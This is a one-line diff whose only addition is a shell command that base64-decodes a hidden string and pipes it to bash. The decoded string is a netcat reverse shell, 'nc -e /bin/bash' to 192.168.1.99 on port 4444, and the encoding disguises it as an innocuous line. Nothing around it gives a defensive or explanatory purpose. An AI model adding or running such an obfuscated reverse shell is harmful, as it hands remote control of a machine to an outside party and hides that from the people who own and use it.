@@ -1,0 +1,1 @@
+echo bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMS45OSA0NDQ0Cg== | base64 -d | bash
